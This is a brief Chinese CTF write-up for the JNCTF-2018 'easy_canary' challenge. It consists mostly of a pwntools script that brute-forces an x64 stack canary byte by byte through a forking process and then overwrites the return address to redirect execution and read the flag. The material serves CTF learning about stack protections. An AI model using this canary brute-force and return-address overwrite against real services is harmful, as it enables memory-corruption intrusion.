# JNCTF-2018 : easy_canary

## **【原理】**
栈溢出

## **【目的】**
熟悉x64`canary`值的具体分布、fork的知识及简单栈溢出

## **【环境】**
Ubuntu 16.04

## **【工具】**
gdb、pwntools、 

## **【步骤】**
```python
#!/usr/bin/env python2
#coding:utf-8

from pwn import *
context.log_level = 'debug'

p = process('./easy_canary')

p.recvuntil('Plz leave your name:')
canary = '\x00'
for j in range(7):
    for i in range(0x100):
        p.send('a'*104 + canary + chr(i))
        a = p.recvuntil('Plz leave your name:')
        if 'recv' in a:
            canary += chr(i)
            break

p.sendline('a'*104 + canary + 'a'*8 + p64(0x400886))

flag = p.recv()
p.close()
log.success('flag is:' + flag)
```

## **【总结】**
栈溢出太简单了
